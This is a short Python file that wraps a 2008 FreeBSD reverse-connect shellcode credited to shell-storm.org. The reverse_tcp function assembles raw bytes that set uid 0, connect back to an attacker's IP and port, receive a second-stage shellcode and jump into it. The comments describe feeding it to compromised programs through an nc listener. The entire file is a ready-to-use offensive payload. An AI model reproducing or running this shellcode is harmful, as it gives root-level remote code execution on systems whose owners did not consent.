#http://shell-storm.org/shellcode/files/shellcode-167.php

#; sm4x - 2008
#; reverse connect dl(shellcode) and execute, exit
#;  - i've used this to feed pwnd progs huge messy shellcode ret'ing the results over nc ;)
#;  - feed it with a $nc -vvl -p8000 <shellcode_in_file
#; setuid(0); socket(); connect(); dups(); recv(); jmp; exit();
#; 90 bytes (NULL free dep on remote address)
#; FreeBSD 7.0-RELEASE

def reverse_tcp(ip, port):
	#push    0x90011ac      ; host 172.17.0.9
	#push    0x401f02AA     ; port 8000
	shellcode =  r"\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80\x50"
	shellcode += r"\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89"
	shellcode += r"\xc2\x68"
	shellcode += ip
	shellcode += r"\x68"
	shellcode += port
	shellcode += r"\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0"
	shellcode += r"\x62\x50\xcd\x80\x75\x24\xb1\x03\x31\xdb"
	shellcode += r"\x53\x52\xb0\x5a\x50\xcd\x80\x43\xe2\xf6"
	shellcode += r"\x31\xc0\x66\x68\x04\x04\x8d\x8c\x24\xfc"
	shellcode += r"\xfb\xff\xff\x51\x52\xb0\x03\x50\xcd\x80"
	shellcode += r"\xff\xe1\x31\xc0\x40\x50\x50\xcd\x80"
	return shellcode




